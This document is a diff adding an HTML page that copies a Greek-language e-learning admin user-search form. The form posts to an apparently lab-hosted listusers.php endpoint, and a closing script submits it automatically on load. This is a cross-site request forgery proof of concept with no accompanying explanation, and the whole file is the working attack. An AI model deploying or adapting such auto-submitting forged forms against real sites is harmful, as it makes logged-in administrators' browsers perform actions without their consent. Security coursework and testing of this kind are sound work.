@@ -1,0 +1,88 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/listusers.php?search=yes' method='post'>
+ <table width="99%">
+ <tbody><tr>
+ <th width="220">&nbsp;</th>
+ <td><b>Στοιχεία χρήστη</b></td>
+ </tr>
+ <tr>
+ <th class='left'>Επώνυμο:</th>
+ <td><input type="text" class='FormData_InputText' name="user_surname" size="40" value=""></td>
+ </tr>
+ <tr>
+ <th class='left'>Όνομα:</th>
+ <td><input type="text" class='FormData_InputText' name="user_firstname" size="40" value=""></td>
+ </tr>
+ <tr>
+ <th class='left'>Αριθμός μητρώου:</th>
+ <td><input type="text" class='FormData_InputText' name="user_am" size="30" value=""></td>
+ </tr>
+ <tr>
+ <th class='left'>Τύπος χρήστη:</th>
+ <td>
+ <select name='user_type'  class='auth_input'>
+ <option selected value='0'>Όλοι οι Χρήστες</option>
+ <option value='1'>Εκπαιδευτής</option>
+ <option value='5'>Εκπαιδευόμενος</option>
+ <option value='10'>Χρήστης Επισκέπτης</option>
+ </select>
+ </td></tr>
+ <tr>
+ <th class='left'>Ημερομηνία εγγραφής:</th>
+ <td>
+ <select name='user_registered_at_flag'  class='auth_input'>
+ <option value='1'>Μετά από</option>
+ <option value='2'>Πρίν από</option>
+ </select>
+ <input style="width: 15em; color: #840; background-color: #ff8; border: 1px solid #000; text-align: center" name="date" value=" " id="f-calendar-field-1" type="text" /><a href="#" id="f-calendar-trigger-1"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%d-%m-%Y","daFormat": "%Y/%m/%d","showOthers":true,"align": "Tl","inputField": "f-calendar-field-1","button": "f-calendar-trigger-1"});</script>&nbsp;&nbsp;&nbsp;<select name='hour'>
+       <option value='0'>0</option>
+       <option value='1'>1</option>
+       <option value='2'>2</option>
+       <option value='3'>3</option>
+       <option value='4'>4</option>
+       <option value='5'>5</option>
+       <option value='6'>6</option>
+       <option value='7'>7</option>
+       <option value='8'>8</option>
+       <option value='9'>9</option>
+       <option value='10'>10</option>
+       <option value='11'>11</option>
+       <option value='12'>12</option>
+       <option value='13'>13</option>
+       <option value='14'>14</option>
+       <option value='15'>15</option>
+       <option value='16'>16</option>
+       <option value='17'>17</option>
+       <option value='18'>18</option>
+       <option value='19'>19</option>
+       <option value='20'>20</option>
+       <option value='21'>21</option>
+       <option value='22'>22</option>
+       <option value='23'>23</option>
+       <option value='24'>24</option></select>&nbsp;&nbsp;&nbsp;<select name="minute"><option value='0'>0</option><option value='5'>5</option><option value='10'>10</option><option value='15'>15</option><option value='20'>20</option><option value='25'>25</option><option value='30'>30</option><option value='35'>35</option><option value='40'>40</option><option value='45'>45</option><option value='50'>50</option><option value='55'>55</option></select>
+     </td>
+   </tr><tr>
+ <th class='left'>email:</th>
+ <td><input type="text" class='FormData_InputText' name="user_email" size="40" value=""></td>
+ </tr>
+ <tr>
+ <th class='left'><b>Όνομα χρήστη (username):</b></th>
+ <td><input type="text" name="user_username" class='FormData_InputText' size="40" value=""></td>
+ </tr>
+ <tr>
+ <th>&nbsp;</th>
+ <td colspan="2">
+ <input type="hidden" name="c" value="searchlist">
+ <input type="submit" name="search_submit" value="Αναζήτηση">
+ </td>
+ </tr>
+   </tbody>
+   </table>
+
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
